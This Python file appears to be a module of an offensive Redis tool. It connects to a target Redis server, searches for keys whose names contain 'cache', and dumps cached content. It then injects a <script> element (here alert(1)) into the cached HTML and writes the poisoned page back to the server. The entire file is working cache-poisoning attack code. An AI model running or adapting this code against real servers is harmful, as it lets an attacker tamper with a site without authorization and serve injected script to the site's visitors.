# -*- coding: utf-8 -*-
import binascii
import six
import redis
import logging

from lxml import etree

log = logging.getLogger()


# ----------------------------------------------------------------------
def dump_key(key, con):

	key_type = con.type(key).lower()
	val = None
	if key_type in (b"kv", b"string"):
		val = con.get(key)
	if key_type == b"hash":
		val = con.hgetall(key)
	if key_type == b"zet":
		val = con.zrange(key, 0, -1)
	if key_type == b"set":
		val = con.mget(key)

	if val is not None:
		if isinstance(val, list):
			if val[0] is None:
				return None
		return val
	return None


# ----------------------------------------------------------------------
def search_caches(con):
	"""
	Try to search cache keys
	"""
	found = False

	for x in con.keys():
		if "cache" in str(x).lower():
			yield x


# ----------------------------------------------------------------------
def handle_html(config, content):
	"""
	Modify the HTML content
	"""

	# --------------------------------------------------------------------------
	# Prepare info
	# --------------------------------------------------------------------------
	for i, x in enumerate(content):
		if chr(x) == "<":
			pos_ini = i
			break

	for i, x in enumerate(content[::-1]):
		if chr(x) == ">":
			pos_end = len(content) - i
			break

	if pos_ini is None or pos_end is None:
		return None

	# prefix = content[:pos_ini]
	# suffix = content[pos_end:]

	txt_content = content[pos_ini:pos_end]

	# Parse input
	tree = etree.fromstring(txt_content, etree.HTMLParser())
	doc_root = tree.getroottree()

	# Find an insert script injection
	for point in ("title", "body"):
		insert_point = doc_root.find(".//%s" % point)

		if insert_point is None:
			continue

		# Add the injection
		ss = etree.Element("script")
		ss.text = "alert(1)"

		insert_point.addnext(ss)

		# Found and insert point -> break
		break

	# --------------------------------------------------------------------------
	# Fix results
	# --------------------------------------------------------------------------

	# Result
	# result = bytearray(prefix) + bytearray(etree.tostring(doc_root)) + bytearray(suffix)

	return bytes(etree.tostring(doc_root))
	# return bytes(result)


# ----------------------------------------------------------------------
def action_redis_cache_poison(config):
	"""
	Dump all redis information
	"""
	log.error("Trying to connect with redis server...")

	# Connection with redis
	con = redis.StrictRedis(host=config.target, port=config.port, db=config.db)

	if not config.cache_key:
		cache_keys = set(search_caches(con))
	else:
		if config.cache_key is None:
			cache_keys = list(search_caches(con))[0]
		else:
			cache_keys = [config.cache_key]

	# --------------------------------------------------------------------------
	# Find caches
	# --------------------------------------------------------------------------
	if config.search_cache is True:
		log.error("Looking for caches in '%s'..." % config.target)

		for x in cache_keys:
			log.warning("  - Possible cache found in key: %s" % str(x))

		if not cache_keys:
			log.warning("  - No caches found")

		# Stop
		return

	# --------------------------------------------------------------------------
	# Explode caches
	# --------------------------------------------------------------------------
	for val in cache_keys:
		content = dump_key(val, con)

		# If key doesn't exist content will be None
		if content is None:
			log.error("  - Provided key '%s' not found in server" % val)
			continue

		# --------------------------------------------------------------------------
		# Action over caches
		# --------------------------------------------------------------------------
		# Modify
		modified = handle_html(config, content)

		if modified is None:
			log.warning("Can't modify content")

		# Reset information
		con.setex(val, 200, modified)


